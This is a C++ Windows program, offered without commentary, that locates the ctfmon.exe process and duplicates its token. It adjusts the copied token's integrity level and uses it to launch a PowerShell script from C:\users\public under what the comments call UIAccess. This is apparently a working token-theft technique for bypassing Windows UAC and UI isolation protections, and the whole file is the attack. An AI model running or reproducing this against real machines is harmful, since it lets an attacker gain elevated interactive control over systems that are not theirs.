#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>

// Helper function to adjust token integrity
bool SetTokenIntegrityLevel(HANDLE hTokenTarget, HANDLE hTokenSource) {
    DWORD dwSize = 0;
    TOKEN_MANDATORY_LABEL* pTILSource = nullptr;

    // Get the integrity level of the current process token
    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, nullptr, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token integrity level size: " << GetLastError() << std::endl;
        return false;
    }

    pTILSource = (TOKEN_MANDATORY_LABEL*)malloc(dwSize);
    if (!pTILSource) {
        std::cerr << "Memory allocation failed.\n";
        return false;
    }

    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, pTILSource, dwSize, &dwSize)) {
        std::cerr << "Failed to get token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    // Set the integrity level for the target token
    if (!SetTokenInformation(hTokenTarget, TokenIntegrityLevel, pTILSource, dwSize)) {
        std::cerr << "Failed to set token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    free(pTILSource);
    return true;
}

int main(int argc, char* argv[]) {
    const wchar_t* targetProcess = L"ctfmon.exe"; // Use a wide string literal (L"")
    DWORD targetPID = 0;

    // Take a snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take process snapshot." << std::endl;
        return 1;
    }

    PROCESSENTRY32W pe32; // Use the wide version of PROCESSENTRY32
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Iterate through the processes
    if (Process32FirstW(hSnapshot, &pe32)) { // Use the wide-character version of Process32First
        do {
            if (_wcsicmp(pe32.szExeFile, targetProcess) == 0) { // Compare wide strings
                targetPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32)); // Use the wide-character version of Process32Next
    }

    CloseHandle(hSnapshot);

    if (targetPID != 0) {
        std::wcout << L"PID of " << targetProcess << L" is: " << targetPID << std::endl;
    }
    else {
        std::wcerr << L"Process " << targetProcess << L" not found." << std::endl;
        return 1;
    }


    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        std::cerr << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hCurrentProcessToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentProcessToken)) {
        std::cerr << "Failed to open current process token: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        std::cerr << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Set the integrity level to match the current process
    if (!SetTokenIntegrityLevel(hNewToken, hCurrentProcessToken)) {
        std::cerr << "Failed to set integrity level: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Prepare to create a new process with UIAccess
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    WCHAR commandLine[] = L"powershell.exe -Command C:\\users\\public\\getitdone.ps1";
    // Create the process with UIAccess
    if (!CreateProcessAsUser(hNewToken,
        nullptr,
        commandLine, // Replace with your desired process
        nullptr,
        nullptr,
        FALSE,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        nullptr,
        nullptr,
        &si,
        &pi)) 
    {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Process created with PID: " << pi.dwProcessId << std::endl;

    // Clean up
    CloseHandle(hNewToken);
    CloseHandle(hCurrentProcessToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
